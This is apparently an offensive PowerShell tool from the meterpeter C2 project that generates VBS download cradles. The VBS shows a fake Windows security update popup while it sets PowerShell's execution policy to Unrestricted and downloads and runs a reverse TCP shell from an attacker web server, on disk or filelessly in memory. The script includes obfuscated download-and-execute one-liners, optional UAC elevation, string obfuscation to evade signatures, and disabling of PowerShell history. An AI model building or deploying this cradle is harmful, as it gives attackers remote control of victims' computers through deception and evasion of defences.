<#
.SYNOPSIS
   Cmdlet to create Download_Crandle.vbs

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19043) x64 bits
   Required Dependencies: @Meterpeter C2 v2.10.11
   Optional Dependencies: none
   PS cmdlet Dev version: v1.2.10

.DESCRIPTION
   Cmdlet to create download_crandle.vbs that allow @Meterpeter C2 v2.10.11
   users to create VBS download crandles to download\execute rev tcp shells
   in background process ( orphan ) with or without UAC elevation privileges.

.NOTES
   If invoked -action 'download' then cmdlet creates Download_crandle.vbs
   that downloads\executes your payload.ps1 from %tmp% remote location.

   If invoked -action 'fileless' then cmdlet creates Download_crandle.vbs
   with payload FileLess (ram) execution ( payload does not touch disk )

   If invoked -UACElevation 'true' then cmdlet creates Download_crandle.vbs
   with UAC elevation function, If invoked -UACElevation 'false' then cmdlet
   creates Download_crandle.vbs without the UAC elevation function technic.

   Remark: The UAC elevation function spawns an UAC GUI to user at runtime
   asking to run the application with 'administrator' token privileges and
   It also adds 'Set-MpPreference -DisableScriptScanning 1' to the download
   crandle if invoked together with -UACElevation 'true' argument declaration.

   Remark: This cmdlet obfuscates crandle.vbs API's calls evertime thats
   executed to allow for crandle signature modify everytime its created.

.Parameter Action
   Accepts arguments: download, fileless (default: download)

.Parameter UACElevation
   Accepts arguments: true, false (default: false)

.Parameter Technic
   The Fileless technic to use (default: one)

.Parameter Egg
   Build using @Meterpeter? (default: false)

.Parameter VbsName
   VBS name (default: Download_Crandle.vbs)

.Parameter PayloadName
   Payload Name (default: Update-KB5005101.ps1)

.Parameter HttpServerPort
   Python3 http.server port (default: 8087)

.EXAMPLE
   PS C:\> .\crandle_builder.ps1 -UACElevation 'true'
   creates 'Download_crandle.vbs' with UAC elevation function

.EXAMPLE
   PS C:\> .\crandle_builder.ps1 -UACElevation 'false'
   creates 'Download_crandle.vbs' without the UAC elevation function

.EXAMPLE
   PS C:\> .\crandle_builder.ps1 -UACElevation 'false' -vbsname "MineDownloader.vbs"
   creates 'MineDownloader.vbs' without the UAC elevation function technic

.EXAMPLE
   PS C:\> .\crandle_builder.ps1 -action 'fileless' -UACElevation 'true'
   creates 'Download_crandle.vbs' (FileLess payload exec) with UAC elevation

.EXAMPLE
   PS C:\> .\crandle_builder.ps1 -action 'fileless' -Technic "two"
   creates 'Download_crandle.vbs' (FileLess payload exec technic 2)

.EXAMPLE
   PS C:\> .\crandle_builder.ps1 -action 'fileless' -Technic 'three'
   creates 'Download_crandle.vbs' (FileLess payload exec technic 3)

.INPUTS
   None. You cannot pipe objects into crandle_builder.ps1

.OUTPUTS
   * Creating 'Download_Crandle.vbs'.[download]
   * Done, Crandle Created, Exiting..[OK]

   ' Author: @r00t-3xp10it (ssa)
   ' Application: meterpeter v2.10.11 download crandle
   ' Description:
   '   This VBS changes PS 'ExecutionPolicy' to 'UnRestricted', spawns a msgbox
   '   pretending to be a security KB5005101 21H1 update, while downloads\executes
   '   meterpeter client.ps1 (rev_tcp_shell) in background from attacker webserver
   ' ---

   dIm 2GCp1,pGtyZ,wohSwPE
   2GCp1="@!COLOMBO@!"+":007:VIRIATO@!"+"NAVIGATOR@!"
   wohSwPE=rEpLaCe(2GCp1, "@!", ""):pGtyZ=rEpLaCe(wohSwPE, ":007:", "")

   .. SNIPED ..
   }
   
.LINK
   https://github.com/r00t-3xp10it/meterpeter
   https://gist.github.com/r00t-3xp10it/e4cdc510f72e91a69c203e1ed7e5a6d1#comments
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$PayloadName="Update-KB5005101.ps1",
   [string]$VbsName="Download_Crandle.vbs",
   [string]$HttpServerPort="8087",
   [string]$UACElevation="false",
   [string]$Action="download",
   [string]$Technic="one",
   [string]$Egg="false"
)


$IPATH = (Get-Location).Path.ToString()
$ErrorActionPreference = "SilentlyContinue"
#Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$Rand = -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_}) # Only Random letters!
$Apii = -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_}) # Only Random letters!

If($Action -iNotMatch '^(download|fileless)$')
{
   write-host "`n*" -ForegroundColor Red -NoNewline;
   write-host " Wrong Parameter input [ " -ForegroundColor DarkGray -NoNewline;
   write-host "-action '$Action'" -ForegroundColor Red -NoNewline;
   write-host " ]" -ForegroundColor DarkGray;
   exit #Exit @crandle_builder
}


If($Egg -ieq "false")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Crandle Manual Build Function

   .NOTES
      Crandle_Builder.ps1 its an auxiliary module of @Meterpeter C2 v2.10.11
      that allow is users to created download crandles. But it can be manual
      executed ( without @Meterpeter C2 v2.10.11 ) to create crandles localy.

      Remark: python3 (http.server) its required to store\deliver payload.ps1
      Remark: Download_Crandle.vbs + Payload.ps1 should be placed on http.server
      working directory, and Download_Crandle.vbs script must be deliver to target.
   #>

   #Get Local host adress to confing crandles (manual execution)
   $Local_Host = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]
   $FirstRange = $Local_Host[0,1,2,3,4] -join ''                          # 192.1   - COLOMBO
   $SeconRange = $Local_Host[5,6,7,8] -join ''                            # 68.1    - VIRIATO
   $TrithRange = $Local_Host[9,10,11,12,13,14,15,16,17,18,19,20] -join '' #.72
   $LastRanges = "$TrithRange" + ":" + "$HttpServerPort" -join ''         #.72:8087 - NAVIGATOR

   #Dispaly OnScreen ( CmdLet Manul execution )
   write-host "`n*" -ForegroundColor Green -NoNewline;
   write-host " Creating '" -ForegroundColor DarkGray -NoNewline;
   write-host "$VbsName" -ForegroundColor Green -NoNewline;
   write-host "'" -ForegroundColor DarkGray -NoNewline;
   write-host ".[$Action]" -ForegroundColor DarkGray; 
}

## List Of Download Crandle Technics ( download crandles - download \ fileless )
# Research: https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#downloadexecution-lolbin
$TechnicDefault_Tmp = "po@!#r&%h#ll.#x# cd `$Env:TMP;po@!#r&%h#ll.#x# i@!r -Uri http://`"+Cmd+`"/$PayloadName -OutFil# $PayloadName;po@!#r&%h#ll -Fil# $PayloadName"
$TechnicFileLessOne = "po@!#r&%h#ll -@!indo@!&%tyl# hidd#n -C `"+InvokeMe+`" (N#@!-Obj#ct N#t.W#bCli#nt).Do@!nload&%tring('http://`"+Cmd+`"/$PayloadName')"
$TechnicFileLessTwo = "po@!#r&%h#ll -@!indo@!&%tyl# hidd#n `$VPN=N#@!-Obj#ct N#t.W#bCli#nt;`$VPN.proxy=[N#t.W#bR#qu#st]::G#t&%y&%t#mW#bProxy();`$VPN.Proxy.Cr#d#ntial&%=[N#t.Cr#d#ntialCach#]::D#faultCr#d#ntial&%;`"+InvokeMe+`" `$VPN.Do@!nload&%tring('http://`"+Cmd+`"/$PayloadName');"
$TechnicFileLessTre = "po@!#r&%h#ll -@!indo@!&%tyl# hidd#n [IO.&%tr#amR#ader]::n#@!([N#t.@!#bR#qu#&%t]::Cr#at#('http://`"+Cmd+`"/$PayloadName').G#tR#spon&%#().G#tR#spon&%#&%tr#am()).R#adTo#nd()|&(''.SubString.ToString()[67,72,64]-Join'')"
$TechnicFileLessXml = "po@!#r&%h#ll -@!indo@!&%tyl# hidd#n `$Proxy=N#@!-Obj#ct -ComObj#ct M&%Xml2.&%#rv#rXmlHttp;`$Proxy.Op#n('GET','http://`"+Cmd+`"/$PayloadName',0);`$Proxy.&%#nd();[&%criptblock]::Cr#at#(`$Proxy.R#spon&%#T#xt).Invok#()"

If($Action -ieq "download")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Creates download crandles (not fileless)

   .NOTES
      This function creates crandles with or without UAC elevation
      function and auto-deletes the crandle downloader in the end.
   #>

#Deobfuscating strings ( download technics ) at runtime
$TechnicDefault_Tmp = $TechnicDefault_Tmp -replace '@!','w' -replace '#','e' -replace '&%','s'
$UserLand = @("' Author: @r00t-3xp10it (ssa)
' Application: meterpeter v2.10.11 download crandle
' Description:
'   This VBS changes PS 'ExecutionPolicy' to 'UnRestricted', spawns a msgbox
'   pretending to be a security KB5005101 21H1 update, while downloads\executes
'   meterpeter client.ps1 (rev_tcp_shell) in background from attacker webserver.
' ---

dIm $Apii,Cmd,Layback
$Apii=`"@!COLOMBO@!`"+`":007:VIRIATO@!`"+`"NAVIGATOR@!`"
Layback=rEpLaCe($Apii, `"@!`", `"`"):Cmd=rEpLaCe(Layback, `":007:`", `"`")

set ObjConsole = CreateObject(`"Wscript.Shell`")
CreateObject(`"wscript.shell`").popup `"THIS SOFTWARE IS PROVIDED BY THE REGENTS AND`" & vbcrlf & `"CONTRIBUTORS AS IS AND ANY EXPRESS OR IMPLIED`" & vbcrlf & `"WARRANTIES, INCLUDING, BUT NOT LIMITED TO THE`" & vbcrlf & `"IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES ; LOSS OF USE, DATA, OR PROFITS, BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY IN WHETHER THE CONTRACT, STRICT LIABILITY, OR TORTCH (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`", 5, `"KB5005101 21H1 Update`", 64
ObjConsole.Run(`"cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser`"), 0
ObjConsole.Run(`"$TechnicDefault_Tmp`"), 0
}")


$AutoElevation = @("' Author: @r00t-3xp10it (ssa)
' Application: meterpeter v2.10.11 download crandle
' Description:
'   This VBS changes PS 'ExecutionPolicy' to 'UnRestricted', spawns a msgbox
'   pretending to be a security KB5005101 21H1 update, while downloads\executes
'   meterpeter client.ps1 (rev_tcp_shell) in background from attacker webserver.
' ---

If WScript.Arguments.length = 0 Then
   Set objShell = CreateObject(`"Shell.Application`")
   objShell.ShellExecute `"wscript.exe`", Chr(34) & _
      WScript.ScriptFullName & Chr(34) & `" testme`", `"`", `"runas`", 1
Else
   dIm $Apii,Cmd,Layback
   $Apii=`"@!COLOMBO@!`"+`":007:VIRIATO@!`"+`"NAVIGATOR@!`"
   Layback=rEpLaCe($Apii, `"@!`", `"`"):Cmd=rEpLaCe(Layback, `":007:`", `"`")

   set ObjConsole = CreateObject(`"Wscript.Shell`")
   CreateObject(`"wscript.shell`").popup `"THIS SOFTWARE IS PROVIDED BY THE REGENTS AND`" & vbcrlf & `"CONTRIBUTORS AS IS AND ANY EXPRESS OR IMPLIED`" & vbcrlf & `"WARRANTIES, INCLUDING, BUT NOT LIMITED TO THE`" & vbcrlf & `"IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES ; LOSS OF USE, DATA, OR PROFITS, BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY IN WHETHER THE CONTRACT, STRICT LIABILITY, OR TORTCH (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`", 5, `"KB5005101 21H1 Update`", 64
   ObjConsole.Run(`"cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser`"), 0
   ObjConsole.Run(`"$TechnicDefault_Tmp`"), 0
End If
}")

}
ElseIf($Action -ieq "fileless")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Create FileLess download crandles (payload does not touch disk)

   .NOTES
      This function creates crandles with or without UAC elevation function.
      Remark: objShell.Run() replaced by objShell.Exec() to evade detection.
   #>


If($Technic -ieq "two" -or $Technic -eq 2)
{
   $TechnicNumber = "2"
   #Deobfuscating strings ( download technics ) at runtime
   $CrandleCmdLine = $TechnicFileLessTwo -replace '@!','w' -replace '#','e' -replace '&%','s'
}
ElseIf($Technic -ieq "three" -or $Technic -eq 3)
{
   $TechnicNumber = "3"
   #Deobfuscating strings ( download technics ) at runtime
   $CrandleCmdLine = $TechnicFileLessTre -replace '@!','w' -replace '#','e' -replace '&%','s'
}
ElseIf($Technic -ieq "four" -or $Technic -eq 4)
{
   $TechnicNumber = "4"
   #Deobfuscating strings ( download technics ) at runtime
   $CrandleCmdLine = $TechnicFileLessXml -replace '@!','w' -replace '#','e' -replace '&%','s'
}
Else
{
   $TechnicNumber = "1"
   #Deobfuscating strings ( download technics ) at runtime
   $CrandleCmdLine = $TechnicFileLessOne -replace '@!','w' -replace '#','e' -replace '&%','s'
}

If($Egg -ieq "false")
{
   #Dispaly OnScreen in case its not @Meterpeter exec
   write-host "*" -ForegroundColor Green -NoNewline;
   write-host " Using payload fileless technic..[Id:" -ForegroundColor DarkGray -NoNewline;
   write-host "$TechnicNumber" -ForegroundColor Green -NoNewline;
   write-host "]" -ForegroundColor DarkGray;
}


$UserLand = @("' Author: @r00t-3xp10it (ssa)
' Application: meterpeter v2.10.11 download crandle (FileLess)
' Description:
'   This VBS changes PS 'ExecutionPolicy' to 'UnRestricted', spawns a msgbox
'   pretending to be a security KB5005101 21H1 update, while downloads\executes
'   meterpeter client.ps1 (rev_tcp_shell) in background from attacker webserver
' ---

dIm $Apii,Cmd,Layback,fdx,ttl
ttl=`"I@`":InvokeMe=rEpLaCe(ttl, `"@`", `"EX`")
$Apii=`"@!COLOMBO@!`"+`":007:VIRIATO@!`"+`"NAVIGATOR@!`"
Layback=rEpLaCe($Apii, `"@!`", `"`"):Cmd=rEpLaCe(Layback, `":007:`", `"`")

set ObjConsole = CreateObject(`"Wscript.Shell`")
CreateObject(`"wscript.shell`").popup `"THIS SOFTWARE IS PROVIDED BY THE REGENTS AND`" & vbcrlf & `"CONTRIBUTORS AS IS AND ANY EXPRESS OR IMPLIED`" & vbcrlf & `"WARRANTIES, INCLUDING, BUT NOT LIMITED TO THE`" & vbcrlf & `"IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES ; LOSS OF USE, DATA, OR PROFITS, BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY IN WHETHER THE CONTRACT, STRICT LIABILITY, OR TORTCH (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`", 5, `"KB5005101 21H1 Update`", 64
ObjConsole.Run(`"cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser`"), 0
ObjConsole.Exec(`"$CrandleCmdLine`")
}")


$AutoElevation = @("' Author: @r00t-3xp10it (ssa)
' Application: meterpeter v2.10.11 download crandle (FileLess)
' Description:
'   This VBS changes PS 'ExecutionPolicy' to 'UnRestricted', spawns a msgbox
'   pretending to be a security KB5005101 21H1 update, while downloads\executes
'   meterpeter client.ps1 (rev_tcp_shell) in background from attacker webserver
' ---

'VBS-Auto-Elevation function
If WScript.Arguments.length = 0 Then
   Set objShell = CreateObject(`"Shell.Application`")
   objShell.ShellExecute `"wscript.exe`", Chr(34) & _
      WScript.ScriptFullName & Chr(34) & `" testme`", `"`", `"runas`", 1
Else
   dIm $Apii,Cmd,Layback,fdx,ttl
   ttl=`"I@`":InvokeMe=rEpLaCe(ttl, `"@`", `"EX`")
   $Apii=`"@!COLOMBO@!`"+`":007:VIRIATO@!`"+`"NAVIGATOR@!`"
   Layback=rEpLaCe($Apii, `"@!`", `"`"):Cmd=rEpLaCe(Layback, `":007:`", `"`")

   set ObjConsole = CreateObject(`"Wscript.Shell`")
   CreateObject(`"wscript.shell`").popup `"THIS SOFTWARE IS PROVIDED BY THE REGENTS AND`" & vbcrlf & `"CONTRIBUTORS AS IS AND ANY EXPRESS OR IMPLIED`" & vbcrlf & `"WARRANTIES, INCLUDING, BUT NOT LIMITED TO THE`" & vbcrlf & `"IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES ; LOSS OF USE, DATA, OR PROFITS, BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY IN WHETHER THE CONTRACT, STRICT LIABILITY, OR TORTCH (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`", 5, `"KB5005101 21H1 Update`", 64
   ObjConsole.Run(`"cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser`"), 0
   ObjConsole.Exec(`"$CrandleCmdLine`")
End If
}")

}
Else
{
   write-host ""
   write-host "[error] Wrong argument input: $Action" -ForegroundColor Red -BackgroundColor Black
   Get-Help .\crandle_builder.ps1 -full;exit #Exit @Crandle_Builder - Trigger Get-Help function!
}


If($UACElevation -ieq "True")
{
   #Build crandle with UAC elevation
   echo $AutoElevation|Out-File "$VbsName" -Encoding string -Force
   If($Egg -ieq "false")
   {
       #Replace the attacker ip addr (obfuscated\split) on vbs template
       ((Get-Content -Path "$VbsName" -Raw) -Replace "VIRIATO","$SeconRange")|Set-Content -Path "$VbsName"
       ((Get-Content -Path "$VbsName" -Raw) -Replace "COLOMBO","$FirstRange")|Set-Content -Path "$VbsName"
       ((Get-Content -Path "$VbsName" -Raw) -Replace "NAVIGATOR","$LastRanges")|Set-Content -Path "$VbsName"   
   }
}
Else
{
   #Build crandle without UAC elevation
   echo $UserLand|Out-File "$VbsName" -Encoding string -Force
   If($Egg -ieq "false")
   {
       #Replace the attacker ip addr (obfuscated\split) on vbs template
       ((Get-Content -Path "$VbsName" -Raw) -Replace "VIRIATO","$SeconRange")|Set-Content -Path "$VbsName"
       ((Get-Content -Path "$VbsName" -Raw) -Replace "COLOMBO","$FirstRange")|Set-Content -Path "$VbsName"
       ((Get-Content -Path "$VbsName" -Raw) -Replace "NAVIGATOR","$LastRanges")|Set-Content -Path "$VbsName"  
   }
}


If($Egg -ieq "false")
{
   Start-Sleep -Milliseconds 500
   #Make sure crandle.vbs was successfuly created ...
   If(Test-Path -Path "$VbsName" -EA SilentlyContinue)
   {
      #Dispaly OnScreen in case its not @Meterpeter exec
      write-host "*" -ForegroundColor Green -NoNewline;
      write-host " Done, Crandle Created, Exiting..[" -ForegroundColor DarkGray -NoNewline;
      write-host "OK" -ForegroundColor Green -NoNewline;
      write-host "]`n`n" -ForegroundColor DarkGray;

      Start-Sleep -Milliseconds 700
      #Print OnScreen the contents of crandle.vbs
      Get-Content -Path "$VbsName" -EA SilentlyContinue|Select-Object -SkipLast 1
      Start-Sleep -Milliseconds 800

      write-host "*" -ForegroundColor Green -NoNewline;
      write-host " Storage: '" -ForegroundColor DarkGray -NoNewline;
      write-host "${IPATH}\${VbsName}" -ForegroundColor Green -NoNewline;
      write-host "' [" -ForegroundColor DarkGray -NoNewline;
      write-host "OK" -ForegroundColor Green -NoNewline;
      write-host "]" -ForegroundColor DarkGray;
   }
   Else
   {
      #Dispaly OnScreen in case its not @Meterpeter exec
      write-host "*" -ForegroundColor Red -NoNewline;
      write-host " Fail to create create Crandle..[" -ForegroundColor DarkGray -NoNewline;
      write-host "FAIL" -ForegroundColor Red -NoNewline;
      write-host "]" -ForegroundColor DarkGray;
      exit     
   }
}